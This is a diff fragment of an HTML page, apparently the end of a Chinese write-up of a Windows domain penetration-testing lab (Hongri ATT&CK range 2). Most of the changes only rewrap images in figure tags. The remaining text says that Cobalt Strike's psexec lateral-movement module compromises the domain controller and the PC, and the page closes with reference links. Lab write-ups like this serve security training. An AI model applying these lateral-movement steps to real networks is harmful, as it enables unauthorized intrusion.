+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_26.png" alt="" /></figure>
+
+
+</p>
 <h3 id="cs后渗透_横向移动">CS后渗透_横向移动</h3>
 <p>上线cs之后,使用cs上面的横向移动模块中psexec就能解决掉剩下的两台机器了</p>
 <p>域控
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_27.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_27.png" alt="" /></figure>
+
+
+</p>
 <p>PC机器
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_28.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_28.png" alt="" /></figure>
+
+
+</p>
 <h1 id="links">links</h1>
 <p><a href="https://xz.aliyun.com/t/11676" target="_blank" rel="noopener nofollow noreferrer" >https://xz.aliyun.com/t/11676</a></p>
 <p><a href="https://www.viewofthai.link/2022/09/11/" target="_blank" rel="noopener nofollow noreferrer" >https://www.viewofthai.link/2022/09/11/</a>红日att＆ck系列靶场（二）/</p>
